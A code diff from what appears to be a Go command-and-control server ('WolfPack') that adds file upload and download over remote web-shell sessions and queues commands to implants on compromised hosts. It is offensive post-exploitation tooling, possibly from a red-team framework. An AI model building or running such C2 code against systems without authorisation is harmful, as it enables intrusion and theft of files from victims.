@@ -209,7 +209,7 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 				core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": cmd " + cmdString)
 
 				if core.Sessions[getActiveSession].CommandQuery != "" {
-					data, err := core.ExecuteConnection(core.Sessions[getActiveSession].Rhost, core.Sessions[getActiveSession].Rport, core.Sessions[getActiveSession].Protocol, core.Sessions[getActiveSession].ShellPath, core.Sessions[getActiveSession].CommandQuery, cmdString, core.Sessions[getActiveSession].Query, core.Sessions[getActiveSession].RequestType)
+					data, err := core.ExecuteConnection(core.Sessions[getActiveSession].Rhost, core.Sessions[getActiveSession].Rport, core.Sessions[getActiveSession].Protocol, core.Sessions[getActiveSession].ShellPath, core.Sessions[getActiveSession].CommandQuery, cmdString, core.Sessions[getActiveSession].Query, core.Sessions[getActiveSession].RequestType, "", "")
 					if err != nil {
 						data = "an error occurred executing the connection, is the shell still up?"
 					}
@@ -293,19 +293,55 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 						core.LogData("Session " + strconv.Itoa(getActiveSession) + " file contents was empty, no file written for:\n" + getFileName)
 						fmt.Println("\nSession " + strconv.Itoa(getActiveSession) + " file contents was empty, no file written for:\n" + getFileName)
 					} else {
-						var cmdString = "upload " + getFileName + " " + getFile
 
-						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
-						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+						if core.Sessions[getActiveSession].CommandQuery != "" {
+							var cmdString = "upload"
+
+							core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+							_, err := core.ExecuteConnection(core.Sessions[getActiveSession].Rhost, core.Sessions[getActiveSession].Rport, core.Sessions[getActiveSession].Protocol, core.Sessions[getActiveSession].ShellPath, core.Sessions[getActiveSession].CommandQuery, cmdString, core.Sessions[getActiveSession].Query, core.Sessions[getActiveSession].RequestType, getFileName, getFile)
+							if err != nil {
+								errorString := "an error occurred executing the connection, is the shell still up?"
+								core.LogData(errorString)
+								returnErr := errors.New(errorString)
+								ErrorHandler(returnErr)
+							}
+
+						} else {
+							var cmdString = "upload " + getFileName + " " + getFile
+
+							core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+							core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+						}
 					}
 				}
 			} else if getCommand[0] == "download" {
 
 				if getFileName != "" {
-					var cmdString = "download " + getFileName
-					core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to download the file: " + getFileName)
-					core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
-					core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					if core.Sessions[getActiveSession].CommandQuery != "" {
+
+						var cmdString = "download"
+
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to download the file: " + getFileName)
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						data, err := core.ExecuteConnection(core.Sessions[getActiveSession].Rhost, core.Sessions[getActiveSession].Rport, core.Sessions[getActiveSession].Protocol, core.Sessions[getActiveSession].ShellPath, core.Sessions[getActiveSession].CommandQuery, cmdString, core.Sessions[getActiveSession].Query, core.Sessions[getActiveSession].RequestType, getFileName, "")
+						if err != nil {
+							data = "an error occurred executing the connection, is the shell still up?"
+						}
+
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " returned:\n" + data)
+
+						currentWolf := core.Wolves[CurrentOperator]
+						jsonData := `{"filename":"` + getFileName + `", "file":"` + data + `"}`
+						core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+					} else {
+						var cmdString = "download " + getFileName
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to download the file: " + getFileName)
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
 				}
 
 			}
